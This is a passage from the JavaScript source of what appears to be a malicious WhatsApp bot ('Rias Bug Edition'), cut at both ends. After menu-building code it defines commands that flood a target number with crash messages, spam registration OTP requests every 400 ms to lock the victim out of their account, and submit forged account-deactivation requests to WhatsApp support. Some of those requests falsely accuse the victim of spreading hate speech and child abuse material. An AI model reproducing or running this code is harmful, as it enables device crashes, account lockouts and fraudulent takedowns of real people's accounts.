                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'checkaccount':
            case 'account': {
            ToxxicTechInc.sendMessage(from, { react: { text: "📁", key: m.key } })
               let a = db.data.users[sender]
               let b = `Below is your account information\n`
               b += `================================\n`
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               b += `Title: ${a.title}\n`
               b += `Afk Time: ${a.afkTime}\n`
               b += `Afk Reason: ${a.afkReason}\n` 
               b += `Nickname: ${a.nick}\n`
               b += `Premium Status: ${a.premium}\n`
               b += `Your Limit: ${a.limit}\n`
               b += `================================`
               ToxxicTechInc.sendMessage(sender, { text: b }, { quoted: m })
               newReply('Account Details Has Been Sent In Private Chat')
            }
            break
            case 'limit':
            case 'checklimit': {
               let a = db.data.users[sender]
               let b = `Your Limit ${a.limit}\n` 
               b += `Premium Status ${isPremium ? 'On' : 'Off' }\n` 
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               newReply(b)
            }
            break
            
            //bug && war cases 
//⚠️do not edit cases otherwise bug not work
//bug cases 
case 'clearchat':
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
case 'beta-new': case 'beta-old': case 'wa-ori':  case 'wa-busins': case 'wa-mod': {
if (!isPremium) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Example: .${command} 234xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return newReply(`\`[ # ]\` Enter Number Without 0\n\n\`[ # ]\` Example : .${command} 234xxx`)
let Pe = peler + '@s.whatsapp.net'
await newReply(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, zpay)
await iponcrash(Pe, force)
await sendPaymentInfoMessage(Pe, zynbug)
await sendSystemCrashMessage(Pe, force)
await sendPaymentInfoMessage(Pe, zynxzobug)
await iponcrash(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zpay)
await ngeloc(Pe, force)
await sendPaymentInfoMessage(Pe, zpay)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, force)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
await sendPaymentInfoMessage(Pe)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
}
await newReply(mess.donebug)
}
break

case 'riascrash': case 'good-night': case 'xiphone':  case 'xcrash': case 'xvirus': {
if (!isPremium) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Example: .${command} 234xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return newReply(`\`[ # ]\` Enter Number Without 0\n\n\`[ # ]\` Example : .${command} 234xxx`)
let Pe = peler + '@s.whatsapp.net'
await newReply(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendPaymentInfoMessage(Pe)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, zpay)
await iponcrash(Pe, force)
await sendPaymentInfoMessage(Pe, zynbug)
await sendSystemCrashMessage(Pe, force)
await sendPaymentInfoMessage(Pe)
await iponcrash(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zpay)
await ngeloc(Pe, force)
await sendPaymentInfoMessage(Pe, zpay)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, force)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
}
await newReply(mess.donebug)
}
break

case 'xreact': case '🐉': case '🐜':  case '🦖': case '🌷': {
if (!isPremium) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Example: .${command} 234xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return newReply(`\`[ # ]\` Enter Number Without 0\n\n\`[ # ]\` Example : .${command} 234xxx`)
let Pe = peler + '@s.whatsapp.net'
await newReply(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendPaymentInfoMessage(Pe)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
ToxxicTechInc.sendMessage(Pe, {text: `\`𝑹𝒊𝒂𝒔 𝑩𝒖𝒈 𝑬𝒅𝒊𝒕𝒊𝒐𝒏\``}, {quoted: m})
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
}
await newReply(mess.donebug)
}
break

case 'lockotp': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Example: ${prefix + command} 234|9xxx`)
if (!/|/.test(text)) return newReply(`Write it Like This\n ${prefix + command} 234|9017372790`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban/ban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await newReply(`𝐎𝐓𝐏 𝐋𝐎𝐂𝐊 𝘈𝘤𝘵𝘪𝘷𝘢𝘵𝘦𝘥 𝘍𝘰𝘳 @${fullNo}. \n𝑹𝒊𝒂𝒔 𝑾𝒊𝒍𝒍 𝑲𝒆𝒆𝒑 𝑺𝒑𝒂𝒎𝒎𝒊𝒏𝒈 𝑻𝒉𝒆 𝑶𝒕𝒑 𝑻𝒊𝒍𝒍 𝑻𝒉𝒆 𝑬𝒏𝒅 𝑶𝒇 𝑻𝒊𝒎𝒆. `)
let { state } = await useMultiFileAuthState('tempban')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: '+' + fullNo,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(100)
await dropNumber()
}
} catch (error) {
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban/ban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break

//ban/unban cases
case 'out': case 'verif':{
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv6': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 234123456789`)
let Lorenzonumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let Lorenzotesx = await ToxxicTechInc.onWhatsApp(Lorenzonumx)
if (Lorenzotesx.length == 0) return newReply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let Lorenzoxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = Lorenzoxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(Lorenzoxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", Lorenzonumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ToxxicTechInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv3': {
if (!isPremium) return replyprem(mess.premium)
